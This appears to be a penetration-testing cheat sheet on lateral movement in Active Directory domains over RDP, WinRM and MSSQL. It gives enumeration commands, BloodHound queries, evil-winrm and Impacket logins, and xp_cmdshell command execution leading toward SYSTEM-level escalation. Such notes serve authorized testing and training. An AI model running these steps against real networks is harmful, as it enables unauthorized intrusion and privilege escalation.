**Overview:**
- Post-foothold lateral movement targets RDP, WinRM, and MSSQL to expand access across the domain. Each vector can be enumerated via BloodHound edges (`CanRDP`, `CanPSRemote`, `SQLAdmin`) before attempting access.
- RDP requires local admin or explicit group membership on the target. Even non-admin accounts can have RDP rights, making it useful for pivoting into hosts where privilege escalation can then be attempted.
- WinRM (PSRemoting) allows remote command execution and interactive PowerShell sessions. Access may be low-privileged but still useful for credential hunting or escalation.
- MSSQL instances with sysadmin accounts expose `xp_cmdshell`, enabling OS command execution in the context of the SQL Server service account. Combined with `SeImpersonatePrivilege`, this often leads to SYSTEM via potato-style attacks.
- BloodHound Cypher queries can map which users have each type of access across the domain without noisy enumeration.
---
## RDP

```powershell
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Desktop Users"
```

Enumerates members of the Remote Desktop Users group on a target host using PowerView.

```powershell
xfreerdp /v:<target-ip> /u:<user> /p:<password> /drive:share,<local-path>
```

Connects to the target via RDP and mounts a local directory as a shared drive for file transfer.

---
## WinRM

```powershell
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Management Users"
```

Enumerates members of the Remote Management Users group on a target host using PowerView.

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

BloodHound Cypher query to identify all users with WinRM access across the domain. Copy into the Raw Query box.

>**Windows:**

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<domain>\<user>", $password)
Enter-PSSession -ComputerName <target> -Credential $cred
```

Creates a credential object and establishes an interactive PowerShell session over WinRM.

>**Linux:**

```bash
evil-winrm -i <target-ip> -u <user> -p <password>
```

Establishes an interactive PowerShell session over WinRM from Linux.

---
## MSSQL

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

BloodHound Cypher query to identify users with SQL Admin rights across the domain.

>**Windows:**

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

Imports PowerUpSQL and enumerates all SQL Server instances registered in the domain.

```powershell
Get-SQLQuery -Verbose -Instance "<target-ip>,1433" -username "<domain>\<user>" -password "<password>" -query '<query>'
```

Connects to a specific MSSQL instance and executes a query. `-Verbose` shows connection details.

> **Linux:**

```bash
mssqlclient.py <domain>/<user>@<target-ip>
```

Connects to an MSSQL instance using Impacket. Prompts for password interactively.

---
## xp_cmdshell Execution

```sql
enable_xp_cmdshell
```

Enables `xp_cmdshell` from within an `mssqlclient.py` session. Required before running OS commands.

```sql
xp_cmdshell <command>
```

Executes an OS command in the context of the SQL Server service account. If the output returns`SeImpersonatePrivilege`, escalation to SYSTEM via PrintSpoofer, RoguePotato, or JuicyPotato is likely viable depending on the OS version.
